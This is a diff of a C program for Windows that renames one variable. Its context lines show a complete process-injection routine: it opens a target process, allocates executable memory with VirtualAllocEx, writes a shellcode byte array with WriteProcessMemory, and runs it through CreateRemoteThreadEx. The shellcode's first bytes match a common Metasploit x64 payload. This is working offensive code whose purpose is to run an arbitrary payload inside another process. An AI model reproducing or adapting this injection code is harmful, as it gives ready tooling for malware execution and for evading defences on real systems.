@@ -9,7 +9,7 @@ int main(int argc, char *argv[]) {
 
   DWORD dwPID = 0, dwTID = 0;
   HANDLE hProcess = NULL, hThread = NULL;
-  LPVOID rAlloc_mem = NULL;
+  LPVOID lpAlloc_mem = NULL;
 
   unsigned char ShellCode[] =
       "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
@@ -60,10 +60,10 @@ int main(int argc, char *argv[]) {
   okay("Got a handle to the process <%ld>\n\\---0x%p", dwPID, hProcess);
 
   // Now allocate bytes to the process memory.
-  rAlloc_mem =
+  lpAlloc_mem =
       VirtualAllocEx(hProcess, NULL, sizeof(ShellCode),
                      (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-  if (!rAlloc_mem) {
+  if (!lpAlloc_mem) {
     Warn("VirtualAllocEx failed. Error: %lu", GetLastError());
     CloseHandle(hProcess);
     return EXIT_FAILURE;
@@ -73,7 +73,7 @@ int main(int argc, char *argv[]) {
        sizeof(ShellCode));
 
   // Now write the shellcode into the memory.
-  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode),
+  if (WriteProcessMemory(hProcess, lpAlloc_mem, ShellCode, sizeof(ShellCode),
                          NULL)) {
     okay("Wrote %zu bytes to memory\n", sizeof(ShellCode));
   } else {
@@ -83,8 +83,8 @@ int main(int argc, char *argv[]) {
 
   // Now create a thread to run our payload.
   hThread = CreateRemoteThreadEx(hProcess, NULL, 0,
-                                 (LPTHREAD_START_ROUTINE)rAlloc_mem, NULL, 0, 0,
-                                 &dwTID);
+                                 (LPTHREAD_START_ROUTINE)lpAlloc_mem, NULL, 0,
+                                 0, &dwTID);
 
   if (hThread == NULL) {
     Warn("Failed to get handle to the thread, error: %ld", GetLastError());
